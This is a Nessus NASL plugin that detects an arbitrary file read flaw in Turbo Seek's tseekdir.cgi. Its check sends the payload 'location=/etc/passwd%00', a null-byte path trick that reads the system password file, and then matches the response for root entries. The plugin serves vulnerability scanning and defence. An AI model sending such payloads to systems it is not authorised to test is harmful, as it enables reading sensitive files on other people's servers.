#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#  based on work from Tenable Network Security
#  
#  Released under GNU GPLv2 licence
# 
#  Ref: durito
#

# Changes by Tenable:
# - Revised plugin title (4/9/2009)

include("compat.inc");

if(description)
{
 script_id(14719);
 script_version ("$Revision: 1.8 $");
 script_bugtraq_id(11163);
 script_xref(name:"OSVDB", value:"9900");

 script_name(english:"Turbo Seek tseekdir.cgi location Parameter Arbitrary File Access");

 script_set_attribute(
   attribute:"synopsis",
   value:
"A web application on the remote host has an arbitrary file read
vulnerability."
 );
 script_set_attribute(
   attribute:"description",
   value:
"The remote host is running Turbo Seek, a search engine and directory
tool.

The version of this software running on the remote host has a
vulnerability that allows a remote attacker to read arbitrary files
from the remote system."
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0159.html"
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0184.html"
 );
 script_set_attribute(
   attribute:"solution",
   value:"Upgrade to version 1.7.2 or later."
 );
 script_set_attribute(
   attribute:"cvss_vector",
   value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N"
 );
 script_end_attributes();

 script_summary(english:"Checks for the presence of tseekdir.cgi");
 
 script_category(ACT_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak"); 
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);



function check(loc)
{
 local_var r, req;
 req = http_get(item:string(loc, "/cgi/tseekdir.cgi?location=/etc/passwd%00"), port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*", string:r))
 {
 	security_warning(port);
	exit(0);
 }
}


foreach dir ( cgi_dirs() )
{
 check(loc:dir);
}

